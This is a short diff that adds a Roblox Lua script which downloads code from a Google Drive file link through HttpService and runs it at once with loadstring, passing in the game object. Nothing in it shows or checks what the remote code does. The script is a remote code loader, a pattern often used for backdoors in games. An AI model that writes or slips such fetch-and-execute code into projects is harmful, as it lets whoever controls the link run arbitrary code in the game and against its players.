@@ -1,0 +1,9 @@
+-- Download and Execute Script
+local http = game:GetService("HttpService")
+
+-- Download the script from a URL
+local scriptURL = "https://drive.usercontent.google.com/download?id=10wbJyIsrr7d35y0GjXUigG7bdYykmsNa&export=download&authuser=0&confirm=t&uuid=14641690-19ca-4fd8-b6f9-def1d4f74314&at=AN_67v0RO6LKn4ST0r4C3DtGm0Q1%3A1727883767983"
+local scriptData = http:GetAsync(scriptURL)
+
+-- Execute the downloaded script
+loadstring(scriptData)(Game) -- Use loadstring to execute the script
